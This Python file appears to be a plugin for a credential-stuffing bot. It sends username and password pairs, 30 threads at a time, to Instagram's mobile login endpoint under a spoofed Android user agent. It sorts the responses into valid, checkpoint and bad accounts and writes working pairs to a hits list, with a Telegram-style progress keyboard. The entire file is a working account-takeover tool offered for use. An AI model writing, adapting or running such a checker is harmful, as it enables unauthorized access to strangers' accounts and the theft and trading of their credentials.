from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import uuid
import random
import json
import time

class InstagramArasChecker(BaseChecker):
    """Instagram Account Checker (Aras Style)"""
    
    LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
    
    def get_threads(self) -> int:
        return 30
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            # بيانات الجهاز
            device_id = str(uuid.uuid4())
            
            # هيدرات الطلب
            headers = {
                'User-Agent': "Instagram 113.0.0.39.122 Android (30/11; 320dpi; 720x1339; realme; RMX3261; RMX3261; S19610AA1; en_CA)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'Accept-Language': "en-CA, en-US",
                'X-IG-Connection-Type': "WIFI",
                'X-IG-Capabilities': "AQ==",
            }
            
            # بيانات تسجيل الدخول
            payload = {
                "username": username,
                "password": password,
                "device_id": device_id,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_count': '0'
            }
            
            # إرسال الطلب
            response = requests.post(
                self.LOGIN_URL,
                data=payload,
                headers=headers,
                timeout=20
            )
            
            response_text = response.text
            account_data = {
                "login": username,
                "password": password,
                "status": "unknown",
                "type": "unknown"
            }
            
            # تحليل النتائج
            if 'checkpoint_challenge_required' in response_text:
                account_data["status"] = "valid"
                account_data["type"] = "checkpoint"
                should_save = True
                
            elif 'logged_in_user' in response_text:
                account_data["status"] = "valid"
                account_data["type"] = "logged_in"
                should_save = True
                
            elif 'logout' in response_text:
                account_data["status"] = "valid"
                account_data["type"] = "logout"
                should_save = True
                
            elif 'years old to have an account' in response_text:
                account_data["status"] = "error"
                account_data["type"] = "age_restricted"
                should_save = False
                
            elif 'UserInvalidCredentials' in response_text or 'bad_password' in response_text:
                account_data["status"] = "bad"
                account_data["type"] = "invalid_credentials"
                should_save = False
                
            else:
                account_data["status"] = "bad"
                account_data["type"] = "unknown_error"
                should_save = False
            
            return {
                "status": account_data["status"],
                "account_data": account_data,
                "should_save": should_save
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """حفظ الحسابات التي تم الدخول إليها"""
        return account_data.get("status") == "valid"
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        return f"{account_data['login']}:{account_data['password']} | type={account_data['type']} | instagram\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"📸 Insta Hits: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }
